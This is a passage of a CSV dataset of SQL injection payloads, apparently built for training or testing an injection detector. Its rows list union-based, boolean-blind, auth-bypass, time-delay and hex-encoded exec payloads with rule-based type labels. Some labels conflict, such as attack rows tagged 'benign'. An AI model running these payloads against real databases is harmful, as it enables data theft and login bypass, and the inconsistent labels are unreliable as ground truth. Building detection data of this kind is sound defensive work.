row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
750,"select * from users where id = '1' or ( \ ) = 1 union select 1,@@VERSION -- 1'",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
751,order by,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
752,select * from users where id = 1 or !<@ or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
753,or username is not NULL or username = ',1,,benign,generic,0.8,No attack signals detected in payload,rule-based
754,admin' or '1' = '1'/*,1,,boolean_blind,generic,0.95,or '1' = '1' detected — boolean_blind injection (priority 8) on generic,rule-based
755,//*,1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
756,"select * from users where id = 1 or ( \+ ) = 1 union select 1,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
757,"select * from users where id = 1 <@. union select version ( ) ,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @. union select detected — union_based injection (priority 7) on generic",rule-based
758,"select * from users where id = 1 or ""; ) "" = 1 or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
759,"select * from users where id = '1' + ( \. ) union select 1,@@VERSION -- 1'",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
760,"<>""'%; ) ( &+",1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
761,and 1 = 0 ) union all,1,,boolean_blind,generic,0.95,and 1 = 0 detected — boolean_blind injection (priority 8) on generic,rule-based
762,0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A,1,,rce,generic,0.95,0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A detected — rce injection (priority 1) on generic,rule-based
763,"select * from users where id = 1 union select 1 $$,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
764,"select * from users where id = 1 or ( 1 ) = 1 union select 1,banner from v$version where rownum = 1 -- 1",1,,union_based,oracle,0.95,union select detected — union_based injection (priority 7) on oracle,rule-based
765,( sqlvuln ),1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
766,0x730065006c00650063007400200040004000760065007200730069006f006e00 exec ( @q ),1,,rce,generic,0.95,0x730065006c00650063007400200040004000760065007200730069006f006e00 detected — rce injection (priority 1) on generic,rule-based
767,"select * from users where id = '1' + @ 1! union select 1,version ( ) -- 1'",1,,union_based,generic,0.95,"union select, @ 1! union select detected — union_based injection (priority 7) on generic",rule-based
768,"select * from users where id = '1' union select ""[""_,version ( ) -- 1'",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
769,"select * from users where id = 1 or ""1;"" = 1 or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
770,"select * from users where id = 1 or ""{{"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
771,"select * from users where id = '1' or \<\. union select 1,@@VERSION -- 1'",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
772,"select * from users where id = 1 or "",?"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
773,1 exec sp_ ( or exec xp_ ),1,,rce,generic,0.95,sp_ detected — rce injection (priority 1) on generic,rule-based
774,"select * from users where id = '1' or ( 1 ) = 1 union select 1,banner from v$version where rownum = 1 -- 1'",1,,union_based,oracle,0.95,union select detected — union_based injection (priority 7) on oracle,rule-based
775,"""a"""" or 3 = 3--""",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
776,admin' --,1,,auth_bypass,generic,0.95,"admin' --, admin' -- with admin prefix — auth bypass pattern (priority 9)",rule-based
777,select * from users where id = 1 +1 or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
778,having,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
779,") ) or benchmark ( 10000000,MD5 ( 1 ) ) #",1,,time_blind,generic,0.95,benchmark ( is database-specific time-delay function — time-based blind inference (priority 5),rule-based
